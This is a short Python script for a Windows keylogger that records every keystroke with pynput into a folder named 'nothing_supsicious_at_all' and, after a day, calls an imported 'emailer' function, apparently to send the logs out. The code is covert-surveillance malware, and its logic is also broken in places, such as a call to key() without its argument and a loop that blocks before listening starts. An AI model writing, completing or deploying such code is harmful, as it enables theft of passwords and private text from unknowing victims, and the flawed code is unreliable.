from pynput.keyboard import Key, Listener
import logging
import time
import os
import sys
from yeet import emailer


def key(a):
    sec = 0
    if a == 0:
        path = "C:/Users/Public/nothing_supsicious_at_all"
        os.mkdir(path, 0o777)
        path2 = "C:/Users/Public/nothing_supsicious_at_all/output"
        os.mkdir(path2, 0o777)
    while sec != 86400:

        log_dir = "C:\\Users\\Public\\nothing_supsicious_at_all\\output\\"

        logging.basicConfig(filename=(log_dir + "output.txt"),
                            level=logging.DEBUG, format='%(asctime)s: %(message)s')

        time.sleep(1)
        sec += 1

    if sec == 86400:
        emailer()
        return 86400


a = 0
key(a)
while key() == 86400:
    a += 1
    key(a)


def on_press(key):
    logging.info(str(key))


with Listener(on_press=on_press) as listener:
    listener.join()
